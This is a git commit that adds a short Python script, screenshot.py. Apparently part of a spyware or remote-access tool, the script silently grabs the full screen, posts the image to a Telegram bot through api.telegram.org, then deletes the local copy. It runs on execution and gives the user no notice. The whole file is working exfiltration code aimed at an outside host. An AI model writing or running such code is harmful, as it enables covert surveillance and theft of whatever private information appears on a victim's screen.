82182b097afe0c47a8efc2317a914bfc1fa92848
meli0dasH4ck3r <nguyenvietkhoi.work@gmail.com>
2024-10-29 17:44:49 +0100

    Function send_screenshot

---
+++ screenshot.py
@@ -0,0 +1,26 @@
+import os 
+import datetime
+import requests 
+from PIL import ImageGrab
+from dotenv import load_dotenv
+
+load_dotenv()
+# Bot info and chat id 
+API_TOKEN = os.getenv('API_TOKEN') 
+CHAT_ID  = os.getenv('CHAT_ID')
+
+def send_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        screenshot_file = f'screenshot_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
+        screenshot.save(screenshot_file)
+
+        with open(screenshot_file, "rb") as file:
+            response = requests.post(f'https://api.telegram.org/bot{API_TOKEN}/sendPhoto', data={'chat_id': CHAT_ID}, files={'photo': file})
+            print(response.json())
+
+        os.remove(screenshot_file)
+    except Exception as e:
+        print(f"Error taking or sending screenshot: {str(e)}")
+
+send_screenshot()
